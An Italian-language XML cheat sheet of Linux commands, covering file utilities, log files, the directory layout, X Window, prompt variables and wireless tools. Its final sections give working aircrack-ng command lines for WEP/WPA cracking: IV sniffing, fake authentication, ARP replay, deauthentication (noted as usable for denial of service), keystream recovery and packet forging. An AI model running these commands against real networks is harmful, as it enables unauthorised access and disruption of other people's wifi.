<item name="tee file">
copia lo standard input allo std output e al file

</item>

<item name="read">
legge righe da una file

</item>

<item name="puts">
scrive righe da un file

</item>

<item name="fmt -w 60 doc.txt &gt; d.txt">
formatta il file doc con un numero 60 di colonne

</item>

<item name="fold -w 60 -s doc.txt &gt; d.txt">
simile a fmt ma permette di non troncare le parole al termine delle colonne

</item>

<item name="pdffonts file.pdf">
è molto importante in quanto elenca i font utilizzati nel documento

</item>

<item name="pdfimages file.pdf">
estrae dal file le immagini

</item>

<item name="pdfinfo file.pdf">
da info sul file

</item>

<item name="xpdf .pdf">
visualizzatore di pdf

</item>

<item name="pico">
è un editor di testo presente nel pacchetto sw pine

</item>

<item name="nano">
editor di testo

</item>

<item name="vi">
editor di testo

</item>

<item name="tac">
concatena file al contrario. vedere cat :)

</item>

<item name="cat file">
visualizza il contenuto di un file. -n numera le linee, -A mostra i caratteri di controllo come caratteri normali. Provare cat &gt; &quot;file&quot; per avere un rudimentale editor di testo, una volta scritto tutto il file premere ctrl+c per uscire e salvare

</item>

<item name="head -n file">
mostra le prime n righe

</item>

<item name="tail -n file">
mostra le ultime n righe

</item>

<item name="mc">
Midnight Commander

</item>

<item name="rmdir dir">
rimuove una dir

</item>

<item name="mv oldFile newFile">
permette di rinominare o di spostare un file

</item>

<item name="cd -  ..">
(-) permette di andare all dir precedente (..) alla directory superiore

</item>


<item name="wc file">
permette di un file di ottenere num di caratteri(-c), num di righe(-l), num di parole(-w)

</item>


<item name="gv file/kghostview file/ggv file">
permette di visualizzare file .ps o .pdf

</item>

<item name="xdvi file.dvi">
visualizza file .dvi in modalità X window

</item>

<item name="tr -s '\000' &lt; prova.doc |tr -d '[:cntrl:]' &gt; prova.txt">
permette di modificare un file o standard input. -d cancella caratteri in questo caso cntrl, -s rimpiazza con una singola occorrenza una sequenza di caratteri presente nel SET '000&quot;'. il file finale viene diventa prova.txt

</item>


<item name="md5sum file">
fornisce l'impronta o digest del file per verificare l'autenticita'. vedere anche sum, cksum, sha1sum

</item>

<item name="split -b 1m moni.tif">
suddivide un file. -b &quot;dim&quot; indica la dimensione di ogni blocco. per ricomporre # cat xaa xab xac &gt; moni.tif

</item>

<item name="source file">
permette di ricaricare un file di configurazione che è stato modificato senza dover uscire e rientrare nel sistema. es. bash .bashrc interpreta l'argomento come uno script di shell e lo esegue

</item>

<item name="touch file">
aggiorna i time stamp del file che sono: Data di creazione, Data di modifica, Data di accesso

</item>

</dict>

<!--- ********************************** SICUREZZA ***************************************** -->
<dict name="sicurezza">

<item name="/etc/syslog.conf">
sono presenti tutti i percorsi per i vari tipi di log del sistema. es. /var/log/secure contiene tutto sugli accessi al sistema

</item>

<item name="last -n">
ogni accesso viene di solito memorizzato su un file quando esiste /var/log/wtmp. con last si può visualizzare tale file. n indica le righe da visualizzare. con -f indichiamo un altro file es /var/log/secure, -d permette di conoscere in login remoti nn solo l'utente ma il nome host e l'IP associato, -i è like -d ma l'IP è in forma 0.0.0.0

</item>

<item name="/etc/services">
lista delle porte standard

</item>

<item name="/etc/securetty">
Questo ?le permette di con?gurare quale device TTY è concesso all?utente root. possono per esempio essere concessi dev TTY remoti(tipo ttyS0) o locali (tipo tty1) basta applicare un commento # se si vuole fare in modo tale da avere più sicurezza conviene disabilitare i device remoti

</item>

<item name="lastb">
gli accessi BAD vengono memorizzati in /var/log/btmp  e visualizzati con tale comando. Le opzioni sono le stesse del comando last

</item>

</dict>

<!--- ********************************** DIRECTORY E FILE DI LINUX ***************************************** -->
<dict name="directory e file di linux">

<item name="bin">
Directory dove risiedono i comandi basilari utilizzati durante l?avvio del sistema e per le procedure basilari di autenticazione. Comunque comandi accessibili da utente.
</item>


<item name="sbin">
Directory dove risiedono i comandi basilari per la gestione del sistema, chiaramente non destinati agli utenti.
</item>


<item name="dev">
Directory dove sono posizionati i dispositivi necessari per accedere a periferiche o sistemi di memorizzazione.
</item>

<item name="etc">
Directory dove sono disposti i ?le di con?gurazione del sistema.
</item>


<item name="home">
Directory dove vengono dislocate le home degli utenti, ovvero lo spazio riservato ad ogni singolo utente (es. /home/darshan è la directory home dell?utente darshan).
</item>


<item name="lib">
Directory delle librerie condivise dai programmi e utili per il loro funzionamento.
</item>


<item name="proc">
E' un file system virtuale inesistente sul disco o meglio senza reale allocazione su disco. Viene utilizzato per disporre informazioni di sistema relative in modo particolare al kernel.
</item>



<item name="tmp">
Directory dei file temporanei.
</item>


<item name="var">
Dati variabili, code di stampa.
</item>


<item name="usr">
E' la directory che contiene gran parte dei programmi esistenti nel sistema e per questo motivo ha dimensioni superiori alle directory precedentemente esaminate. Al suo interno esistono ulteriori gerarchie:
*   /usr/X11R6 Directory destinata al sistema X Window
*   /usr/bin Gran parte dei comandi utente.
*   /usr/games Giochi e programmi educativi.
*   /usr/include Directory destinata a contenere i file header
*   /usr/lib Librerie.
*   /usr/local Gerarchia locale.
*   /usr/sbin Programmi di sistema non essenziali.
*   /usr/share Dati indipendenti dall?architettura hardware
*   /usr/src Directory delle sorgenti.
</item>


</dict>

<!--- ********************************** COLORI ***************************************** -->
<dict name="colori">

<item name="echo -e \E[GRASSETTO;COLORE1;COLORE2mQui va inserito il testo.">

GRASSETTO vale 1 (attivo) oppure 0 (nn attivo). \E[0m ripristina le impostazioni precedenti
Colore  Primo piano Sfondo
        30          40
nero
        31          41
rosso
        32          42
verde
        33          43
giallo
        34          44
blu
        35          45
magenta
        36          46
cyan
        37          47
bianco
</item>




</dict>
<!--- ********************************** X WINDOW ***************************************** -->
<dict name="X WINDOW">

<item name="xte">
Si trova nel pacchetto xautomation:<command name="sudo apt-get install xautomation"/>
Esempi d'uso:
*   Per scrivere una stringa nell'app in focus - <command name="xte 'sleep 5' 'str hello world' 'key Return'"/>
*   Per muovere il mouse in una certa posizione dello schermo - <command name="xte 'sleep 1' 'mousemove 9999 0'"/>

</item>

<item name="xterm -rightbar -bg white -fg black">apre un terminale per X windows. -bg è il background, -fg è il foreground, -rightbar con la barra a destra. premendo con il tasto destro del mouse e CTRL è possibile avere dei menu per configurazioni.</item>

<item name="xclock">visualizza l'ora -analog, -digital, -update &quot;sec&quot;, -hands &quot;colore&quot; </item>

<item name="xvidtune">serve per configurare le freq del monitor e altro ancora..</item>

<item name="xset">è un utilità che permette di configurare diversi device tra cui mouse monitor ecc, provare xset --help che è fatto bene. Es. per inserire i path dei font # xset fp+ /usr/X11R6/lib/fonts/directory/ opp per rimuovere #  xset fp- /usr/X11R6/lib/fonts/directory/</item>

<item name="xsetpointer">permette di mostrare e configurare dispositivi di puntamento per l'ambiente grafico</item>

<item name="xsetroot -solid blue">permette di configurare lo sfondo dell'ambiente</item>


<item name="Server X">Si tratta del programma che gestisce l?interfaccia gra?ca e accetta le connessioni di rete per la gestione remota.</item>

<item name="Client X">Sono tutti i programmi che utilizzano l?ambiente gra?co gestito dal Server X, sia sulla macchina locale che su computer in rete.</item>

<item name="Protocollo X">Rappresenta il protocollo di comunicazione utilizzato dal Server X e dai relativi client.</item>

<item name="Window Manager">Sono particolari software diretti a gestire le ?nestre ed ulteriori componenti sopra il Server X agendo anch?essi come client.</item>

<item name="Ambienti desktop">sono l'evoluzione di questi ultimi perchè offrono la possibilità di gestire eventi in maniera intuitiva tramite il mouse, la periferica di puntamento largamente diffusa.</item>
<item name="Il server XFree86">è una implementazione di X Window System, un potente e complesso ambiente gra?co per sistemi operativi Unix.</item>


<item name="/etc/X11/XF86Config opp /etc/X11/xorg.conf">è un file di configurazione per configurare il Server X. è composto da diverse sezioni ognuna delle quali diretta a config i diversi dispositivi.Esiste anche una sezione XInput dedicata ai disp più particolari quali tavolette grafiche. eistono diversi comandi che permettono di conf auto il file quali: xf86config, XF86Setup, xf86cfg.</item>

<item name="startx">Avvia X Server, deve essere utilizzato dopo la config del file xorg.conf/XF86Config. Possono accadere degli errori all'avvio che possono essere visualizzate in qst modo: startx 2&gt; errori.txt</item>

<item name="xinit">da utilizzare quando startx non funziona</item>

<item name="CNTRL F1....F6">permette in modalità X Server di aprire un terminale in caso di problemi</item>

<item name="linux single">al prompt di lilo permette di avviare linux in modalità runlevel 2 senza avviare X Server</item>

<item name="mkfontdir">Il comando serve per aggiornare il fonts.dir della cartella corrente. fonts.dir è presente in ogni cartella dei font(tipo /usr/X11/lib/fonts/..) specificati nel file di conf xorg.conf, e contiene l'elenco dei font di un certo tipo.</item>

<item name="xlsfonts ">elenca tutti i font attualmente disponibili all?uso e riconosciuti dal Server X elencandoli in una lunga lista organizzata di base alfabeticamente ma facilmente con?gurabile secondo le proprio esigenze con le opzioni presenti.</item>

<item name=".xinitrc">qst file applicato nella propria dir home viene all'avvio eseguito e ci permette di avviare comandi in fase di boot es. xsetroot -solid Gray exec xterm &amp; exec fvwm Nell'esempio presentato si sceglie di utilizzare il Window Manager fvwm con lo sfondo del colore grigio. Viene inoltre lanciato il programma xterm.</item>

<item name=".twmrc">simile a .initrc bisognerebbe studiarlo</item>

<item name="xmodmap">e' un programma per interpretare i segnali da tastiera</item>

<item name="bitmap">avvia un programma di disegno</item>

</dict>


<!--- ********************************** ALTRO ***************************************** -->
<dict name="altro">

<item name="/etc/termcap">
e' un elenco di tutti i terminali che il sistema conosce, e come controllano il cursore (es. xterm, minix opp console che e' un terminale di tipo vt100, ecc). l'aggiunta di un terminale al sistema consiste nel inserire una voce in qst file.

</item>

<item name="TERM">
e' una variabile d'ambiente per impostare il tipo di console per linux

</item>

<item name="PATH">
variabile d'ambiente costituito da un elenco separato da : delle directory in cui la shell deve cercare i programmi. Talvolta e' presente anche la directory corrente &quot;.&quot; ma cio puo essere pericoloso! La variabile e' impostata sul file /etc/profile ed e' comune a tutti gli utenti! in qst modo si evita di impostare a proprio piacimento la variabile PATH per ogni utente uno per uno sul file .bashrc

</item>

<item name="PS1">
variabile d'ambiente che serve per personalizzare il prompt. Viene impostato dal file /etc/profile. Es. PS1='$PWD&gt;' opp PS1=&quot;\u@\h:\w\$ &quot; opp PS1=&quot;\[\033[1;34m\]\u@\h:\w\$ \033[0m &quot; opp PS1='\[\e[34;1m\]\u@\h:\w\$ \[\e[0m\]' opp PS1='\[\033[01;31m\]\h \[\033[01;34m\]\W \$ \[\033[00m\]'. In qst esempio si usano particolari apici `comando` qst permettono di valutare e di fornire l'output al posto degli apici e del comando!!!!! Es.PS1='`hostname`:`pwd`# ' opp PS1='! ${PWD/#$HOME/~}$ ' opp  PS1='%n@%m:%~%# '

</item>


<item name="loadkeys it">
carica la tastiera in italiano

</item>

<item name="cal">
visualizza un calenadrio. -1 un mese -3 tre mesi -y un anno ecc

</item>

<item name="expr">
comando utilissimo per operazioni aritmetiche ( matematica ) tra stringhe

</item>

<item name="date">
visualizza la data
It is possible to show previous dates. Examples:
<command name="$ date --date='10 seconds ago'"/>
<command name="$ date --date='1 days ago'"/>
<command name="$ date --date='yesterday'"/>

</item>

<item name="hwclock --show">
visualizza la data

</item>

<item name="hwclock --date='7/15/2000 16:45:05'">
imposta la data. con --utc si specifica la data in formato UTC

</item>

<item name="hwclock --systohc &amp; ">
imposta la data dell'orologio hw a partire da quello di sistema

</item>

<item name="hwclock --hctosys &amp; ">
imposta la data di sistema a partire da quella dell hw

</item>

<item name="rdate -sp tempo.cstv.to.cnr.it">
sincronizza l'ora di sistema

</item>

<item name="ispellconfig">
permette di configurare l'utilità di controllo ortografico ispell

</item>


<item name=" echo laboratoio | ispell -a">
effettua il controllo ortografico

</item>

<item name="Wildcards - caratteri jolly - espressioni regolari">
permettono di agire su una lista numerosa di ?le. I metacaratteri supportati dalla gran parte delle shell sono: * espande zero o più caratteri, ? espande un unico carattere, [a-z] espande un carattere nell?intervallo a-z(altri es. [A-Za-z] che corrisponde a [:alpha:]; opp [0-9] che corrisponde a [:digit:]; opp [A-Za-z0-9] che corrisponde [:alnum:]),  [abc] espande un carattere nell'insieme (a, b, c), ^ vieta la corrispondenza successiva (ad esempio [^abc]), ~ rappresenta la home directory dell'utente. Per disabilitare l'uso dei metacaratteri è necessario anteporre il carattere '\'. Qst permette di usare [ opp ] come dei caratteri. Altri operatori sono es. R? indica l'opzione; R+ indica uno o più d uno; R{5} significa 5 coppie;R{2,5} indica tra 2 e 5; R{2,} indica 2 o più; ^r una r solo se inizia in una linea; r$ una r solo se è alla fine di una linea; \n rapp la nuova linea; Road|Street indica l'unione; . rappresenta qualunque carattere. Ad es. '[A-Z]( [a-z])' serve per indicare anche lo spazio, ma è importante l'uso delle apici per far capire che si tratta di uno stessa espressione regolare. Vedere cmq man flex nella sezione PATTERNS opp man awk nella sez regular expr per una più dettagliata rappr. Nell'esempio che segue viene dimostrato come utilizzare un comando della shell associandolo con il metacarattere '*' per rimuovere tutti i file che hanno 'stat' come parte iniziale del nome: $ rm -fr stat*.

</item>

<item name="lex flex">
analizzatori lessicali (non conosco bene)

</item>

</dict>

<!--- ********************************** WIFI ***************************************** -->
<dict name="wifi">

<item name="iwconfig">
analogo di ifconfig, serve a settare i parametri citati prima.

</item>
<item name="iwlist">
fa uno scan per i peer o gli AP, o elenca le funzionalit? del driver

</item>
<item name="iwspy">
colleziona statistiche su un peer remoto della LAN

</item>
<item name="iwpriv">
parametri specifici del driver

</item>
<item name="iwevent">
monitor di eventi sull'interfaccia

</item>

<item name="wlanconfig ">

</item>

</dict>

<!--- ********************************** WIFI CRACK ***************************************** -->
<dict name="wifi crack">

<item name="airodump-ng">
sniffa pacchetti. --ivs specifica solo pacchetti ivs, -w &quot;file&quot; scrive i pacchetti in un file, -c &quot;chan&quot; indica il canale nel quale sniffare, -bssid &quot;AP&quot; indica l'AP in cui sniffare
Sniffa i pacchetti contenti IV:<commands name="airodump-ng -c $chan -w capturefile --ivs ath1"/>
</item>

<item name="aircrack-ng opts file_dump">
serve per crakkare una kiave, -e essid, -b bssid, -a algoritmo ad es. 1 per WEP o 2 per WPA, -n num si usa per specificare il num di bit della kiave se si conosce, -f num es 3 o 4 piu' e' piccolo e piu' il tempo diminuisce ma le possibilit? di trovare la kiave diminuiscono, -w file serve per la WPA per un dizionario che puo' essere scaricato opp generato da JohnTheRipper
</item>

<item name="ivstools --merge &lt;ivs file 1&gt; &lt;ivs file 2&gt; .. &lt;output file&gt;">
Fonde in un singolo file tanti dump diversi
</item>

<item name="mergecap [options] -w &lt;outfile|-&gt; &lt;infile&gt; ...">
simile a ivstools. fa parte di wireshark. es: mergecap -T ieee-802-11 -w final_dump.pcap dump1.pcap dump2.pcap dump3.pcap

</item>


<item name="airdecap-ng">
decritta un pacchetto WEP/WPA data una chiave valida. 

</item>

<item name="kstats">
data una chiave valida, ed un dump, dice quale attacco statistico funziona meglio. 

</item>
<item name="  ">

</item>
<item name="makeivs">
genera un file pcap di test per provare il cracking con aircrack-ng. 

</item>

<item name="packetforge-ng">
forgia un pacchetto in modo da poterlo usare con aireplay-ng. 

</item>

<item name="airmon-ng">
mette la scheda wireless in monitor mode. es airmon-ng start ath1

</item>

<item name="aireplay-ng">
inietta del traffico artificiale verso la rete. 

</item>

</dict>

<!--- ********************************** AIREPLAY ***************************************** -->
<dict name="aireplay">

<item name="aireplay-ng -e #ssid rete# -a #macAP# -h #mioMAC# --fakeauth #tempo# #nomescheda#">
 Fake Authentication Serve per individuare se AP risponde come tempo mettere es 10 opp 0 sec. Se AP non risponde, pu? darsi ci sia firewall MAC, in ogni caso non funzionera' airodump

</item>


<item name="aireplay-ng --arpreplay -b #macAP# -h -#mioMAC# #nomescheda#">
 questo programma funziona similmente ad uno sniffer, andando alla ricerca dei pacchetti ARP request, ovvero i pacchetti interessanti al fine del crakkaggio. Una volta ottenuto, inizia a rimandarlo all'AP che risponder? con degli IV che verranno sniffati da airodump

</item>


<item name="aireplay-ng -0 $numVolte -a $AP -c $client ath0">
 Attacco di deautenticazione, Questo attacco puo' essere usato per recuperare un SSID nascosto (cioe' che non e'broadcast), catturare una handshake WPA a 4 vie o lanciare un attacco di tipo Denial of Service. Lo scopo dell'attacco ? di obbligare il client a ri-autenticarsi che, consente all'aggressore di falsare gli indirizzi MAC.

</item>


<item name="aireplay-ng -4 -h $client ath0">
Decriptare pacchetti WEP senza conoscere la chiave. Vengono creati due file pcap: uno per il pacchetto decifrato e l'altro per il relativo keystream. il file .cap puo' essere letto da un lettore (es. tcpdump); mentre il file .xor puo' essere utilizzato per falsare pacchetti e inviarli.

</item>


<item name="aireplay-ng -5 -b $AP -h $WIFI ath1">
Permette di ricavare il keystream con la tecnica del fragment

</item>


<item name="aireplay -2 -r forge-arp.cap ath0">
Ritrasmissione di un pacchetto alterato con arpforge

</item>

</dict>

<!--- ********************************** WIFI OTHER***************************************** -->
<dict name="wifi other">

<item name="arpforge replay_dec-0916-114019.xor 1 $manDest $macSource $ipSource $ipDest forge-arp.cap">
Falsifica i pacchetti da un host all'altro. si puo recuperare il keystream con aireplay-ng -4
</item>

<item name="packetforge-ng -0 -a $AP -h $WIFI -k 255.255.255.255 -l 255.255.255.255 -y ilFile.xor -w file">
Genera un pacchetto da essere utilizzato con aireplay -2 per iniettare pacchetti di tipo arp-request nella rete, e fare l'airodump
</item>

<item name="tcpdump -s 0 -n -e -r replay_dec-0916-114019.cap">
tcpdump per leggere un plaintext ottenuto con aireplay-ng -4
</item>
<item name="aircrack-ng -a 1 -e $AP -b final_dump.pcap">
Programma per trovare la kiave
</item>
</dict>

</dicts>
